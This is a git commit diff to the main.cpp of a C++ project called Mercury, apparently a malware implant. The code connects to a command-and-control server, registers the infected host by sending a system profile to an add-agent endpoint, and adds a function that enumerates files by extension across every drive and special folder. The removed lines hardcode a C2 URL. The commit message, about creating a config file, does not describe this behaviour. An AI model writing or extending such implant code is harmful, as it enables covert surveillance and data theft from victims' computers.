4a62e1825c4edae4f721da0491fb35ea48528771
0xConstant <noroh4xy@protonmail.com>
2023-10-13 09:30:43 -0700

    created config file for code files in Communications folder

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -4,10 +4,29 @@
 #include "Communication/c2_resolve.hpp"
 #include "Communication/addagent.hpp"
 #include "Core/helpers.hpp"
+#include "Core/file_search.hpp"
 
 
-constexpr bool ONETIMERUN = true;
-std::vector<std::wstring> URLS = {L"https://hudsonmart.shop"};
+
+std::map<std::string, std::map<std::string, std::string>> FileEnum() {
+    std::vector<std::wstring> DIR_PATHS;
+    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;
+
+    std::vector<std::wstring> drives = Disk_ID();
+    std::vector<std::wstring> specialDirs = GetSpecialPaths();
+    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
+    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());
+
+    for (const auto& PATH : DIR_PATHS) {
+        std::map<std::string, std::map<std::string, std::string>> tempResults;
+        tempResults = FileSearcher(PATH, FILE_EXTS);
+
+        // Append tempResults to FILE_PATHS
+        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
+    }
+
+    return FILE_PATHS;
+}
 
 
 int main() {
@@ -18,7 +37,8 @@ int main() {
         if (ReachIntranet) { 
             std::wstring C2 = C2Conn(URLS); 
             if (!C2.empty()) {
-                std::wstring PC2 = C2 + L"/add_agent";
+                // Path to /add_agent
+                std::wstring PC2 = C2 + Stage1Path;
                 nlohmann::json JsonProfile = Profiler(); 
                 std::string response = SendProfile(PC2, JsonProfile);
                 auto jsonResp = nlohmann::json::parse(response);
